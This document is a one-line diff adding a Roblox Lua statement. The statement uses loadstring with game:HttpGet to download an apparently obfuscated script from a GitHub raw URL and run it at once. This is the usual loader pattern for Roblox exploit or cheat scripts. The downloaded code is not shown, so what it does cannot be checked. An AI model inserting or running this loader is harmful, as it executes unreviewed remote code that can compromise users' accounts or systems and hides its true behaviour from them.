@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zhanzheng666/Roblox/main/Protected_3842695189091576.lua"))()
